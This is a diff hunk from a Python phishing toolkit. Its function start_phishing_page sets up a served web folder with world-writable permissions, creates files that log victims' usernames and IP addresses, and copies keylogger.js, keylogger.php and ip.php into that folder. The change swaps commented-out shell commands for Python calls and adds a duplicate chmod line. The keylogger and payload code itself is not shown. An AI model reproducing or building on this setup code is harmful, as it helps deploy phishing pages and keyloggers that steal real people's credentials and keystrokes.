@@ -230,25 +230,13 @@ ________________________________________________________________________________
 
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
-    #run_command('cd Server')
-    ##os.chdir('Server')
-    #run_command('mkdir www')
-    ##os.mkdir('www')
-    #run_command('chmod 777 Server -R')
+    chmod('Server', 777)
     os.chmod('Server', 777)
-    #os.chdir('Server')
-    #run_command('rm -r Server/www/ && mkdir Server/www')
     rmtree("Server/www", onerror=simple_informant.remove_readonly)
     os.mkdir('Server/www')
     os.chmod('Server/www', 777)
-    #run_command('touch Server/www/usernames.txt && touch Server/www/ip.txt')
     pathlib_Path('Server/www/usernames.txt').touch()
     pathlib_Path('Server/www/ip.txt').touch()
-    #run_command('cp WebPages/ip.php Server/www/
-    # && cp WebPages/KeyloggerData.txt Server/www/
-    # && cp WebPages/keylogger.js Server/www/ 
-    # && cp WebPages/keylogger.php Server/www/ 
-    # && rm -rf link.url')
     copyfile('WebPages/ip.php', 'Server/www/ip.php')
     copyfile('WebPages/KeyloggerData.txt','Server/www/KeyloggerData.txt')
     copyfile('WebPages/keylogger.js', 'Server/www/keylogger.js')
